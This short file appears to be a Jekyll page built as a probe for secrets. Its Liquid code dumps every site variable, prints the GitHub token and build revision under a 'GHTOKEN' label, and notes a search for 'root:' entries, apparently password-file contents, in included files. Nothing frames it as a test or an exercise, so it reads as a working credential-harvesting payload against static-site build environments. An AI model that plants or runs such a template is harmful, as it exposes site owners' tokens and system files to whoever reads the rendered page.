---
title: probe
---
ENVDUMP_START
{% for k in site %}{{ k }}={{ site[k] }}
{% endfor %}
ENVDUMP_END
GHTOKEN={{ jekyll.environment }} / {{ site.github.token }} / {{ site.github.build_revision }}
PASSWDPROBE: look for root: in included files
